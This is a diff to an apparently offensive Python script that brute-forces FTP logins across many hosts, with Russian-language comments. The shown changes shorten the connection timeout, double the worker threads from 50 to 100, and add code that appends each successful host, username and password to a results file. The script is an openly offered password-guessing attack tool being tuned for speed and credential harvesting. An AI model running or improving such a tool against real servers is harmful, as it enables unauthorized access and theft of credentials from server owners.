@@ -1,14 +1,15 @@
 import ftplib
 import threading
 from queue import Queue
-
 def ftp_brute_force(host, username, password, results):
     """Функция для попытки подключения к FTP"""
     try:
-        ftp = ftplib.FTP(host, timeout=10)
+        ftp = ftplib.FTP(host, timeout=9)
         ftp.login(username, password)
         result = f'Success! Host: {host} | Username: {username} | Password: {password}'
         print(result)
+        with open('FTP_results.txt', 'a') as f:
+              f.write(f'{result}\n')
         results.append(result)
         ftp.quit()
     except ftplib.error_perm:
@@ -54,7 +55,7 @@ def main():
     
     # Создание и запуск потоков
     threads = []
-    for i in range(50):
+    for i in range(100):
         thread = threading.Thread(target=worker, args=(target_queue, results))
         thread.daemon = True
         thread.start()
